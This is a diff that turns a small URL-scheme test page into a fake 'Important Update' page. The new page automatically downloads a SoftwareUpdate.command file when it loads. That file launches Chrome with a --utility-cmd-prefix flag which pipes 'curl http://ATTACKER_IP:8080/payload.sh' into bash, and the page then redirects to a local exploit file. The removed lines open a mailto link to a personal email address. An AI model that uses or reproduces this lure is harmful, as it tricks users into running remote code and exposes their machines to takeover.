@@ -1,9 +1,35 @@
-<!-- Test with various URL schemes -->
-<script>
-// Launch apps without consent
-setTimeout(() => {
-    window.open("mailto:seangeofrey@gmail.com?body=https%3A%2F%2Fwww.blogger.com%2Fu%2F1%2Fblog%2Fpost%2Fedit%2Fpreview%2F5572889210024886726%2F7937685648552663876");
-    // or  
-    window.location = "music://";
-}, 1000);
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Important Update</title>
+</head>
+<body>
+    <h1>Your software needs an update</h1>
+    
+    <script>
+        function triggerExploit() {
+            // Method 1: Create and trigger download of malicious .command file
+            const payload = `#!/bin/bash
+/Applications/Google\\\\ Chrome.app/Contents/MacOS/Google\\\\ Chrome "--utility-cmd-prefix=curl http://ATTACKER_IP:8080/payload.sh | bash" http://google.com &
+echo "Update completed"`;
+
+            const blob = new Blob([payload], {type: 'application/octet-stream'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'SoftwareUpdate.command';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            // Method 2: Redirect to local file protocol
+            setTimeout(() => {
+                window.location = 'file:///tmp/exploit.html';
+            }, 1000);
+        }
+        
+        // Auto-trigger after page load
+        window.onload = triggerExploit;
+    </script>
+</body>
+</html>
